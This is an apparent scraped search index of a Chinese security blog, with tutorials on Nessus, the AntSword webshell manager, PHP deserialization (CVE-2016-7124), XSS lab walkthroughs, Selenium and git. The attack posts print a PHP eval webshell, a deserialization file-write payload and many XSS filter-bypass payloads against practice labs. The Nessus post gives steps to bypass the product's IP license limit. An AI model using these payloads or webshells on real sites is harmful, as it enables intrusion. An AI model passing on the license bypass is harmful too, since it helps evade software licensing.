修改安装目录下（D:\\tool\\Nessus）和plugins（D:\\tool\\Nessus\\plugins）目录下的plugin_feed_info.inc文件，将内容更改为123PLUGIN_SET &#x3D; 202107092353 ;&#x2F;&#x2F;这个时间就是你进行注册的时间PLUGIN_FEED &#x3D; &quot;ProfessionalFeed (Direct)&quot;;PLUGIN_FEED_TRANSPORT &#x3D; &quot;Tenable Network Security Lightning&quot;; 重启服务 这时候会发现D:\\tool\\Nessus\\plugins目录下的所有文件都被删除，这是因为Licensed Hosts无限使用后，Plugin_Set会被置空，我们需要将原先备份的文件重新拷贝过来，然后重启服务，就可以成功绕过16个ip的限制 可能出现的问题 如果遇到无法破解还是0~16IP限制，请检查PLUGIN_SET值为前面update all-2.0.tar.gz更新获得的值！ 由于Nessus服务每次重启后，都会重置plugin_feed_info.inc，这将会使nessus/plugins目录下所有的插件都被删除，无法扫描。 Nessus使用安装成功后，我们可以使用scanner进行扫描，主页面如下，提供了很多的模板给我们使用 我们选择basic Network scan,就可以进行扫描器的设置 然后就可以进行扫描，扫描的时间可能会比较久，最后会将结果显示出来。","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"蚁剑下载、安装、使用教程","slug":"蚁剑使用","date":"2020-04-21T06:01:51.000Z","updated":"2021-07-09T12:10:15.662Z","comments":true,"path":"2020/04/21/蚁剑使用/","link":"","permalink":"http://yejuns.github.io/2020/04/21/%E8%9A%81%E5%89%91%E4%BD%BF%E7%94%A8/","excerpt":"","text":"蚁剑下载、安装、使用教程最近重新学习web渗透，突然看到一个工具叫做蚁剑，据说比菜刀还要好用，将学习过程记录一下。 下载下载的时候需要下载两个部分，一个是项目核心源码”antSword“，另一个是加载器，地址是https://github.com/AntSwordProject/ 同时官方给出了详细的文档：https://doc.u0u.us/zh-hans/index.html 安装安装就很简单，去git上下载相应的加载器，然后安装运行。第一次运行选择的如果是空目录，会自动下载源代码到这个目录，待提示初始化完毕时，重新打开蚁剑加载器，即可看到蚁剑的主界面。（我这边无法打开最新的加载器，把版本换成V2.0就可以了） 使用使用其实跟菜刀几乎差不多，只是菜刀太老了，而且蚁剑功能更强大一些 添加一个shell首先：右键单击 - 添加数据其次：输入URL地址，连接密码以及编码设置。PHP语言推荐编辑器使用chr加密（可以自己添加编码器） 插件蚁剑有一个插件市场，可以去下载一些插件。 抓包分析设置一下代理，然后使用burpsuite抓包。根据上面的代理设置进行抓包，连接时拦截，可看见连接传输的内容（a是密码） 实战由于需要一个web环境，我这里有bwapp的环境，就拿来凑合一下。 蚁剑官方给我们提供了一些脚本可以使用，地址是 https://github.com/AntSwordProject/AwesomeScript 我们这里就用一个最简单的一句话木马 1234&lt;?phpecho &#x27;123&#x27;;eval($_REQUEST[&quot;a&quot;]);&gt; 然后将木马放在站点目录下 首先使用浏览器简单访问一下，正常显示，说明没有问题 打开蚁剑添加数据，测试连接 打开虚拟终端","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"fiddler安装以及使用","slug":"fiddler使用","date":"2020-02-21T06:01:51.000Z","updated":"2021-07-01T13:59:03.149Z","comments":true,"path":"2020/02/21/fiddler使用/","link":"","permalink":"http://yejuns.github.io/2020/02/21/fiddler%E4%BD%BF%E7%94%A8/","excerpt":"","text":"fiddler简介Fiddler是位于客户端和服务器端的HTTP代理，也是目前最常用的http抓包工具之一 。 它能够记录客户端和服务器之间的所有 HTTP请求，可以针对特定的HTTP请求，分析请求数据、设置断点、调试web应用、修改请求的数据，甚至可以修改服务器返回的数据，功能非常强大，是web调试的利器。 fiddler是代理，也就是说：客户端的所有请求都要先经过Fiddler，然后转发到相应的服务器，反之，服务器端的所有响应，也都会先经过Fiddler然后发送到客户端，基于这个原因，Fiddler支持所有可以设置http代理为127.0.0.1:8888的浏览器和应用程序。（如果本地启用了ssr等代理软件，如何开启fiddler，后面会讲到） fiddler安装","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"web安全之反序列化漏洞-php","slug":"web安全之反序列化漏洞-php","date":"2020-02-14T08:01:51.000Z","updated":"2021-07-12T12:13:30.617Z","comments":true,"path":"2020/02/14/web安全之反序列化漏洞-php/","link":"","permalink":"http://yejuns.github.io/2020/02/14/web%E5%AE%89%E5%85%A8%E4%B9%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-php/","excerpt":"","text":"1.序列化与反序列化 序列化是指把对象转换为字节序列的过程（便于保存在内存、文件、数据库中） 反序列化是指把字节序列恢复为对象的过程 常见的序列化格式：二进制格式、字节数组、json字符串、xml字符串 2.反序列化漏洞原理服务端未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程(进行反序列化的过程中自动触发了某些魔术方法,魔术方法里面的代码就会被加载执行)，从而导致代码执行，SQL注入，目录遍历等诸多不可控后果。 在PHP中,通过 serialize() 函数进行序列化操作,通过 unserialize() 进行反序列化操作。 serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 序列化格式详解 面向对象语法序列化与反序列化 1234// 将对象student序列化为字符串$a=serialize($student); // 将字符串$a反序列化为对象 $b = unserialize($a); 面向过程语法序列化与反序列化 123$name=&#x27;xiaodi&#x27;;$a=serialize($name); //将一个变量进行序列化: xiaodi =&gt; s:6:&quot;xiaodi&quot;;$b=unserialize($a); //将一个字符串进行反序列化): s:6:&quot;xiaodi&quot;; =&gt; xiaodi PHP反序列化漏洞常用魔术方法 12345__construct() # 当对象被创建时调用__sleep() # 在对象被序列化之前调用__destruct() # 当对象被销毁时调用__toString() # 当对象被当做字符串使用 __wakeup() # 在对象被反序列化之前调用 也就是说，这几个魔术方法的调用过程如下： 对象被创建时执行__construct。 使用serialize()序列化对象。先执行__sleep，再序列化。 unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup()方法，预先准备对象需要的资源。 把对象当做字符串使用，比如将对象与字符串进行拼接，或者使用echo输出对象，会执行__toString 程序运行完毕，对象自动销毁，执行__destruct。 3、实例讲解CVE-2016-7124反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。 漏洞示例代码： 12345678910111213141516171819&lt;?phpclass A&#123;var $target = &quot;test&quot;;function __wakeup()&#123; $this-&gt;target = &quot;wakeup!&quot;;&#125;function __destruct()&#123;$fp = fopen(&quot;C:\\\\phpstudy_pro\\\\WWW\\\\unserialize\\\\shell.php&quot;,&quot;w&quot;); fputs($fp,$this-&gt;target); fclose($fp);&#125;&#125;​$test = $_GET[&#x27;test&#x27;];$test_unseria = unserialize($test);​echo &quot;shell.php&lt;br/&gt;&quot;;include(&quot;.\\shell.php&quot;);?&gt; 代码正常的执行逻辑，应该是：unserialize( )会检查是否存在一个_wakeup( )方法。本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为”wakeup!”。注意，不管用户传入的序列化字符串中的target属性为何值，__wakeup()都会把$target的值重置为”wakeup!”。 但是在反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。所以我们可以构造如下对象作为payload ?test=O:1:”A”:2:{s:6:”target”;s:18:”“;} 真实属性个数是1，只有1个target属性。我们在构造序列化字符串时，将表示对象属性个数的值写成任何大于2的整数，就可以跳过__wakeup()的执行。现在，程序执行的逻辑变为：直接使用unserialize()函数将用户传递的参数进行反序列化。程序执行结束，对象被销毁，调用__destruct()方法，将target变量的值写入文件shell.php中。而target变量的值就是我们用户构造的phpinfo()函数，","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"爬虫之Selenium","slug":"爬虫之selenium","date":"2020-01-31T08:01:51.000Z","updated":"2021-07-19T01:08:06.964Z","comments":true,"path":"2020/01/31/爬虫之selenium/","link":"","permalink":"http://yejuns.github.io/2020/01/31/%E7%88%AC%E8%99%AB%E4%B9%8Bselenium/","excerpt":"","text":"自己的实验需要用到selenium做功能测试，就正好过来总结一下使用的过程 关于SeleniumSelenium是一个用于Web应用程序的自动化测试工具，可以模拟浏览器操作。主要由三部分组成，包括``Selenium WebDriver, Selenium IDE, Selenium Grid`. Selenium WebDriver是客户端API接口，可以通过调用这些接口，访问浏览器驱动，浏览器驱动再访问浏览器。 Selenium IDE是一个浏览器插件，支持Chrome和Firefox,可以将手动测试过程记录下来，并产生自动化测试脚本，可以实现回放。 Selenium Grid可以实现分布式测试 安装Selenium 使用pip安装Selenium，pip install selenium 安装对应的浏览器驱动，只有这样才能驱动浏览器自动测试驱动的版本必须要和浏览器的版本对应（想要查看chrome浏览器版本，在url地址栏输入：chrome://version/；查看Firefox浏览器版本，选择菜单栏 Help -&gt; About Firefox） 我这里的版本是91.0.4472 ，注意前面的就可以了 然后可以查看 官方文档，最下面就有下载的链接， 后面的小版本影响不大，所以我们可以随便选一个 下载完成我看有的人会把驱动放到环境变量里面，我这就不配置了。 简单案例1234567from selenium import webdriverfrom time import sleepdriver = webdriver.Chrome(&quot;D:\\python_program\\my_selenium\\chromedriver_win32\\chromedriver.exe&quot;)# 这里要写到**.exe才行，不然会报错 [permissionerror winerror 5 拒绝访问]driver.get(&#x27;http://www.baidu.com)sleep(2)driver.quit() 运行成功后，会弹出一个相应的chrome浏览器，并定向到百度的页面 关于webDriverSelenium中定位元素的方法都定义在WebDriver类中，这些方法都以find_element_by开头，主要有下列API webDriver的常用属性有：webDriver的常用方法有(其实很多内容官方文档都提供了，我这边就不赘述了) Selenium IDE的使用Selenium IDE可以在chrome扩展程序中找到,安装完成后，主要界面如下然后在地址栏输入url，点击录制。就可以开始进行操作的录制录制结束后，界面上会显示相应的动作函数，可以选择导出为相关的脚本。(导出的脚本会很冗余) 123456789101112131415161718192021222324252627282930class TestTestCase(): def setup_method(self, method): self.driver = webdriver.Chrome() self.vars = &#123;&#125; def teardown_method(self, method): self.driver.quit() def wait_for_window(self, timeout = 2): time.sleep(round(timeout / 1000)) wh_now = self.driver.window_handles wh_then = self.vars[&quot;window_handles&quot;] if len(wh_now) &gt; len(wh_then): return set(wh_now).difference(set(wh_then)).pop() def test_testCase(self): self.driver.get(&quot;https://www.google.com.hk/&quot;) self.driver.set_window_size(1520, 807) self.driver.find_element(By.NAME, &quot;q&quot;).click() self.driver.find_element(By.CSS_SELECTOR, &quot;.sbhl .wM6W7d &gt; span&quot;).click() element = self.driver.find_element(By.CSS_SELECTOR, &quot;div:nth-child(2) &gt; .tF2Cxc .LC20lb&quot;) actions = ActionChains(self.driver) actions.move_to_element(element).perform() self.vars[&quot;window_handles&quot;] = self.driver.window_handles self.driver.find_element(By.CSS_SELECTOR, &quot;div:nth-child(2) &gt; .tF2Cxc .LC20lb&quot;).click() self.vars[&quot;win8089&quot;] = self.wait_for_window(2000) element = self.driver.find_element(By.CSS_SELECTOR, &quot;body&quot;) actions = ActionChains(self.driver) actions.move_to_element(element, 0, 0).perform() self.driver.switch_to.window(self.vars[&quot;win8089&quot;]) Selenium headlessheadless就是我们常说的无头浏览器，因为如果我们部署测试的程序的服务器没有GUI,我们该如何去运行selenium？ 使用Chrome浏览器的无头模式12345from selenium import webdriveroption = webdriver.ChromeOptions()option.add_argument(&#x27;--headless&#x27;)driver = webdriver.Chrome(chrome_options=option) 使用selenium自带的HtmlUnitDriver 使用phantomjs和ghostdriver","categories":[],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://yejuns.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"git使用","slug":"git使用","date":"2019-11-21T03:13:01.000Z","updated":"2021-07-03T15:32:18.059Z","comments":true,"path":"2019/11/21/git使用/","link":"","permalink":"http://yejuns.github.io/2019/11/21/git%E4%BD%BF%E7%94%A8/","excerpt":"","text":"安装Linux 上安装 sudo dnf install git-all # centos上 sudo apt install git-all # ubuntu上 简单使用12345678910git下载后， 要先配置用户名和密码git config --global user.name &#39;yejuns&#39;git config --global user.email &#39;18756561540@163.com&#39;git config -l 列出所有配置git init 初始化本地git项目git remote add origin https:&#x2F;&#x2F;github.com&#x2F;yejuns&#x2F;myNote.git 将本地git项目与远程仓库的项目进行关联git status 查看本地git项目内的变化git add *git commit -m &#39;first commit&#39; 本地修改生效git push -u origin master 向远端推送 windows 上安装官方版本可以在 Git 官方网站下载。 打开 https://git-scm.com/download/win，下载安装版即可 常见问题 Failed to connect to github.com port 443: Timed out首先要确认自己能否正常使用ssh，在终端输入 123$ ssh -T -p 443 git@ssh.github.com&gt; Hi username! You&#x27;ve successfully authenticated, but GitHub does not&gt; provide shell access. 如果显示如上面所示，那就证明SSH是没有问题的，检测一下自己的本地ssh公钥和私钥，然后去看一下github上的配置（但一般也是没有问题的） 可以尝试在自己系统的hosts文件（windows的路径是C:\\Windows\\System32\\drivers\\etc\\hosts,linux的路径是/etc/hosts）中添加github的地址，从而避免DNS解析问题。需要访问https://github.com.ipaddress.com/，从网页中查看相关地址，记录下来同样地，还需要访问https://fastly.net.ipaddress.com/github.global.ssl.fastly.net#ipinfo 和 https://github.com.ipaddress.com/assets-cdn.github.com，并记录相应的ip地址，最后添加如下信息 123456140.82.113.4(第一个网站IP Address) github.com 199.232.69.194(第二个网站的IP Address) github.global.ssl.fastly.net185.199.108.153(第三个网站的IP Address) assets-cdn.github.com185.199.109.153(第三个网站的IP Address) assets-cdn.github.com185.199.110.153(第三个网站的IP Address) assets-cdn.github.com185.199.111.153(第三个网站的IP Address) assets-cdn.github.com 也有说配置全局代理生效的，不过我这边没有成功。","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"http://yejuns.github.io/tags/%E5%B7%A5%E5%85%B7/"}]},{"title":"xss-lab-master靶场题解思路","slug":"xss-lab-master-靶场题解思路","date":"2019-10-31T08:01:51.000Z","updated":"2021-07-03T09:24:02.533Z","comments":true,"path":"2019/10/31/xss-lab-master-靶场题解思路/","link":"","permalink":"http://yejuns.github.io/2019/10/31/xss-lab-master-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AF/","excerpt":"","text":"XSS靶场训练这里我们选择的是xss-lab-master靶场，可以直接下载docker镜像，在本地运行。 level 1当前页面没有任何的提示信息，从URL中可以猜测是通过参数name直接注入 注入语句 1http://127.0.0.1/level1.php?name=&lt;script&gt;alert(12)&lt;/script&gt; 后台源码 12345&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;name&quot;];echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;?&gt; level 2当前页面只有一个文本框，先在文本框中输入&lt;script&gt;alert(12)&lt;/script&gt;, 发现没有效果。可能是对输入进行了转义。但由于输入框并不会对输入的语句清空，因此我们可以尝试闭合&lt;input&gt;标签 注入语句 1http://127.0.0.1/level2.php?keyword=&quot;&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level2.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str.&#x27;&quot;&gt;&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; level 3尝试使用level 2的语句注入，发现不能成功。那可能是对文本框内的内容也进行了转义，尝试通过事件标签触发表单执行注入语句 1http://127.0.0.1/level3.php?keyword=&#x27;οnmοuseοver=&#x27;alert(&#x27;xss&#x27;) 后台源码 12345678910&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;&lt;form action=level3.php method=GET&gt;&lt;input name=keyword value=&#x27;&quot;.htmlspecialchars($str).&quot;&#x27;&gt; &lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&quot;;?&gt; 从源码中可以看到，因为是在标签内部，所以可以使用属性注入，常用的属性 level 4先用测试语句&#39;&#39;;!--&quot;&lt;xss&gt;=&amp;&#123;()&#125;看看有没有过滤，然后先看看源码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1level4.php?keyword=&quot;onfocus=javascript:alert(&#x27;xss&#x27;)&quot; 伪协议后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于对script、on都进行了处理，因此使用javascript伪协议以及标签进行注入，javascript伪协议：在此 1http://127.0.0.1/level4.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;xss&quot; 伪协议123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level4.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以看到对 &gt; &lt; 进行了替换，但忽略了&#39; ,因此可以绕过 1http://127.0.0.1/level5.php?keyword=&quot;οnmοuseοver=&#x27;alert(12)&#x27;&quot; 大小写绕过后台代码 123456789101112&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level5.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str3.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 从代码中可以看出对一些关键词都进行了替换，但是好在没有对大写字母进行修改，因此可以使用单引号闭合，加大小写的脚本或者标签方法注入。 1http://127.0.0.1/level6.php?keyword=&quot;&gt;&lt;scRipt&gt;alert(/xss/)&lt;/scRipt&gt; 双写绕过123456789101112131415&lt;?php ini_set(&quot;display_errors&quot;, 0);$str =strtolower( $_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form action=level7.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.$str6.&#x27;&quot;&gt;&lt;input type=submit name=submit value=搜索 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 它把特殊语义的字符串修改成了空字符串，我们就可以使用双写的方法进行注入。 1http://127.0.0.1/level7.php?keyword=&quot;&gt;&lt;scrscriptipt&gt;alert(/xss/)&lt;/scrscriptipt&gt; 字符实体后台代码 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level8.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 由于会被htmlspecialchars函数转义，所以可将所有字符编码为HTML实体，从而绕过。 HTML实体 HTML编码转换 在文本框输入javasc&amp;#114;ipt:alert(/xss/) 检测关键字存在后台代码 1234567891011121314151617181920212223242526&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);echo &#x27;&lt;center&gt;&lt;form action=level9.php method=GET&gt;&lt;input name=keyword value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;input type=submit name=submit value=添加友情链接 /&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt;&lt;?phpif(false===strpos($str7,&#x27;http://&#x27;))&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;; &#125;else&#123; echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;?&gt; 这里的strpos函数是用来查找指定文本在字符串中第一次出现的位置，这时候我们就不得不在代码里加入http://，但是并没有过滤HTML实体编码，所以还是使用编码绕过 使用过滤HTML实体编码，但是由于需要加入http://，肯定不能在http://后面加代码，必须在前面，并且将http://注释掉才能执行 在文本框输入javasc&amp;#114;ipt:alert(/xss/)//http:// 检测关键字存在先测试一下最基本的xss注入，&lt;script&gt;alert(123)&lt;/acript&gt;,发现没有效果 看网页发现不了关键信息，就查看网页源代码可以发现有一个隐藏的表单,其中含有t_link t_history t_sort这样三个隐藏的&lt;input&gt;标签 构造语句，查看哪个标签可以被突破 1?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_link=&quot; type=&quot;text&quot;&quot;&amp;t_history=&quot; type=&quot;text&quot;&quot;&amp;t_sort=&quot; type=&quot;text&quot;&quot; 可以发现name为t_sort的&lt;input&gt;标签被改变，于是进行尝试对这个标签注入，构造如下代码 12?keyword=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)# 注意这里由于没有文本框，需要在将&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;这行的type值改成text 注入成功 后台代码： 1234567891011121314&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str11 = $_GET[&quot;t_sort&quot;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; Referer信息跟上面的很相似，所以用上面的注入代码尝试一下，发现没有成功，查看网页源代码，可以发现双引号被转义。没有办法，先查看源码，可以发现对str11的过滤并不是很严谨 12345678910111213141516&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = $_GET[&quot;keyword&quot;];$str00 = $_GET[&quot;t_sort&quot;];$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;&lt;form id=search&gt;&lt;input name=&quot;t_link&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_history&quot; value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_sort&quot; value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;input name=&quot;t_ref&quot; value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;&lt;/form&gt;&lt;/center&gt;&#x27;;?&gt; 可以通过抓包工具进行抓包，然后修改里面的referer字段referer:&quot;type=&quot;text&quot; onclick=&quot;alert(&#39;xss&#39;) 最后注入成功 user-agent信息和上题一样的思路，只是将注入点改成UA Cookie信息和上题一样的思路，只是将注入点改成Cookie字段上。 exif xss没做出来，然后百度发现说这种情况很少 ng-include属性第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看源码，可以发现我们输入的值被传入&lt;span&gt;标签的class属性中，同时&lt;,&gt;,&#39;被转义&lt;span&gt;标签前面还有ng-include这样的字符。 ng-include是angular js中的东西，其作用相当于php的include函数。这里就是将后面输入的文件给包含进来。 因此，我们的注入方法是 利用ng-include指令的特性包含一个有漏洞的html文件，注意这里有对尖括号的过滤。 构造如下代码进行注入 1?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; 这里参数值算是一个地址，所以需要添加引号。因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的 html文件给包含进来的意思。 空格==回车第一眼在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码，可以发现关键字script以及 / 和空格都被编码成同样的空格字符实体. 查看源代码 123456789&lt;?php ini_set(&quot;display_errors&quot;, 0);$str = strtolower($_GET[&quot;keyword&quot;]);$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;?&gt; 空格、反斜杠、script都被str_replace函数替换成&amp;nbsp,所以我们考虑用空格来将它们分开，从而避免被替换。而%0a或者%0D当成空格使用，在HTML中这样是合法的 注入语句：http://192.168.226.128/xss-labs-master/level16.php?keyword=&lt;a%0Ahref=&#39;javas%0Acript:alert(&quot;xss&quot;)&#39;&gt;xss 合二为一在url里尝试加入&lt;script&gt;alert(123)&lt;/script&gt;,没有效果，开始查看网页源码,可以发现提交的两个参数的值出现在了标签的src属性值中，同时构造的代码中关键字都被编码。 仔细观察一下，发现&lt;embed&gt;标签就是引入一个swf文件到浏览器端，并且它的src属性值没有添加引号，所以不用闭合 注入语句： 12http://192.168.111.138/xss-labs-master/level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)#注意在arg01这里要添加空格，不然就是将属性与之前的xsf01.swf?进行连接了 level 18思路与上面的类似，只是换了一张不同的图片。注入语句： 1http://192.168.111.138/xss-labs-master/level18.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/) level 19level 